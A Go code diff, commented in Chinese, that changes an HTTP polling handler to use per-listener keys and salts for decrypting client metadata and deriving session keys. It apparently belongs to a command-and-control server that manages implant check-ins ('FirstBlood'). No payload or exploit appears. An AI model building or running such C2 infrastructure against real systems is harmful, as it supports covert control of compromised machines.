@@ -69,7 +69,27 @@ func wrapResponsePad(resp map[string]interface{}) map[string]interface{} {
 	return resp
 }
 
+// listenerKeys 归一化监听器密钥：显式传入（handleOpenPort 从该监听器记录取出）优先，
+// 缺省时按类型查库——单监听器场景两者等价，故显式路径是纯增量修复。
+// 与 websocket 分支的 metaMasterKey 处理一致：显式密钥需按 32/16 字节归一化，
+// 否则超长 VKey（如 base64 44 字符）会导致 HKDF 输入与客户端 patch 的不一致。
+func listenerKeys(vkey, salt []byte, listenerType string) ([]byte, []byte) {
+	if len(vkey) > 0 && len(salt) > 0 {
+		return encrypt.NormalizeListenerKeyConfig(vkey, salt)
+	}
+	return encrypt.GetListenerKeyConfig(listenerType)
+}
+
+// GetHttp HTTP 轮询入口（未显式提供监听器密钥时按类型兜底，保持旧行为）。
 func GetHttp(w http.ResponseWriter, r *http.Request) {
+	GetHttpWithKeys(w, r, nil, nil)
+}
+
+// GetHttpWithKeys 带本监听器密钥的 HTTP 轮询入口。
+// vkey/salt 由 handleOpenPort 从该监听器的记录取出后经闭包传入（与 tcp/kcp/websocket
+// 分支同一处理）：http/https 可多实例且各持独立 VKey/盐，处理器内按类型查库在同类型
+// 多监听器时只能取到任意一行，MetaInfo 解密与会话密钥派生都会用错密钥。
+func GetHttpWithKeys(w http.ResponseWriter, r *http.Request, vkey, salt []byte) {
 	encryptMetainfo := extractMetadata(r)
 
 	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
@@ -89,7 +109,7 @@ func GetHttp(w http.ResponseWriter, r *http.Request) {
 	if r.TLS != nil {
 		cfgType = "https"
 	}
-	metaMK, metaSalt := encrypt.GetListenerKeyConfig(cfgType)
+	metaMK, metaSalt := listenerKeys(vkey, salt, cfgType)
 	// J4: 拒绝公开默认密钥连接
 	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
 		logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
@@ -132,9 +152,9 @@ func GetHttp(w http.ResponseWriter, r *http.Request) {
 	if !exsists { // FirstBlood
 		// 立即为客户端生成会话密钥（确保与客户端同步；仅首次，轮询不得重复派生覆盖唯一化后的密钥）
 		if encrypt.GlobalKeyManager != nil {
-			// 获取监听器特定的密钥配置
-			_, encryptionSalt := encrypt.GetListenerKeyConfig(listenerType)
-			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListener(uid, encryptionSalt, listenerType)
+			// 用本请求已解析出的同一份监听器密钥派生（原实现按类型再查一次，
+			// 同类型多监听器时会与上面 MetaInfo 解密取到不同监听器的密钥）
+			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, metaSalt, metaMK, metaSalt)
 			if err != nil {
 				logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", uid, err)
 			} else {
@@ -227,8 +247,8 @@ func GetHttp(w http.ResponseWriter, r *http.Request) {
 		if encrypt.GlobalKeyManager != nil {
 			nonce := make([]byte, 16)
 			if _, err := rand.Read(nonce); err == nil {
-				vkey, encSalt := encrypt.GetListenerKeyConfig(listenerType)
-				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, encSalt, []byte(vkey), encSalt, nonce)
+				// 同上：与 MetaInfo 解密、会话密钥派生用同一份监听器密钥
+				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, metaSalt, metaMK, metaSalt, nonce)
 				if err != nil {
 					logx.Warnf("⚠️ [HTTP-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
 				} else {
